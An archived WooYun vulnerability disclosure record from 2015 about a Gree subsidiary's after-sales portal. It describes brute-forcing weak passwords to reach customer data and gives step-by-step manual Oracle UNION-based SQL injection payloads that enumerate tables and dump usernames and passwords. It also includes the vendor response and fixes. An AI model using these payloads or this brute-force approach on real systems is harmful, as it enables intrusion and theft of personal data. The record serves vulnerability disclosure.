{"id": 73255, "wybug_id": "wooyun-2015-0154021", "wybug_title": "格力空调多处漏洞涉及200万用户信息（Oracle手工SQL注入）", "wybug_corp": "格力空调", "wybug_author": "进击的zjx", "wybug_date": "2015-11-19 10:49", "wybug_open_date": "2016-01-11 15:32", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向公众公开  简要描述： oracle手注学习记录 详细说明：  重庆明辉格力电器销售有限公司，1998年创立于重庆市高新技术开发区，主要负责格力电器在重庆、四川、云南、贵州和西藏等西南区域的市场开发、产品销售、销售渠道建设与管理及售后服务工作。格力的子公司。**.**.**.**:8010/重庆明辉格力售后系统0x01 无验证码，无错误限制，可爆破\n20072006201020112008201420152012201720182019202020212016201320222023202420252029202620282027203020312032203720362038204020342033204120432044204520352047204920392050204220482046\n爆到了上述一堆账号，密码为1234560x02 随便选一个，成功登陆后台\n\n泄露206万客户信息\n\n65万安装单，泄露用户详细地址电话等\n\n还有短信平台等信息   漏洞证明：  0x03 sql注入后台找到个注入点**.**.**.**:8010/network/AnnouncementInfo.aspx?id=535手工注入一下\n**.**.**.**:8010/network/AnnouncementInfo.aspx?id=535 and 1=1**.**.**.**:8010/network/AnnouncementInfo.aspx?id=535 and 1=2\n返回页面不同\n**.**.**.**:8010/network/AnnouncementInfo.aspx?id=535 and (select count (*) from dual)>0\n页面返回正常，说明是oracle数据库。dual为oracle的公用表\n**.**.**.**:8010/network/AnnouncementInfo.aspx?id=535 order by 7 正常**.**.**.**:8010/network/AnnouncementInfo.aspx?id=535 order by 8 错误\n说明有7个字段\n**.**.**.**:8010/network/AnnouncementInfo.aspx?id=535 union select null,null,null,null,null,null,null from dual\n通过改变每一位的null或者'null'来判断每一个字段是数字型还是字符型\n**.**.**.**:8010/network/AnnouncementInfo.aspx?id=535 union select null,'null','null','null',null,null,'null' from dual\n最终得到2,3,4,7位为字符型\n**.**.**.**:8010/network/AnnouncementInfo.aspx?id=535 union select null,null,(select banner from sys.v_$version where rownum=1),null,null,null,null from dual\n第三位可以显示，爆数据库版本\n\n\n**.**.**.**:8010/network/AnnouncementInfo.aspx?id=535 union select null,null,(SELECT name FROM v$database),null,null,null,null from dual\n当前数据库为ORCL\n\n\n**.**.**.**:8010/network/AnnouncementInfo.aspx?id=535 union select null,null,(select SYS_CONTEXT ('USERENV', 'CURRENT_USER') from dual),null,null,null,null from dual\n当前数据库账号UGLSH\n\n\n**.**.**.**:8010/network/AnnouncementInfo.aspx?id=535 union select null,null,to_char(count(*)),null,null,null,null from USER_TABLES\n第三位是字符型，所以要把count(*)数字型转换成字符型，用to_char()函数得到151张表\n\n\n**.**.**.**:8010/network/AnnouncementInfo.aspx?id=535 union select null,null,TABLE_NAME,null,null,null,null from USER_TABLES\n可以查看当前151张表的具体名字，太长此处就不贴了。\n**.**.**.**:8010/network/AnnouncementInfo.aspx?id=535 union select null,null,COLUMN_NAME,null,null,null,null from COLS where TABLE_NAME='USERINFO'\n找到个USERINFO表，爆其字段，得到USERNAME和USERPWD等\n**.**.**.**:8010/network/AnnouncementInfo.aspx?id=535 union select null,null,USERNAME||'='||USERPWD,null,null,null,null from USERINFO\nUSERINFO中的数据\n\n到此为止！   修复方案：  弱口令修改；SQL语句预编译；   版权声明：转载请注明来源 进击的zjx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-11-24 17:05 厂商回复： CNVD未直接复现所述情况，已经转由CNCERT下发给重庆分中心，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}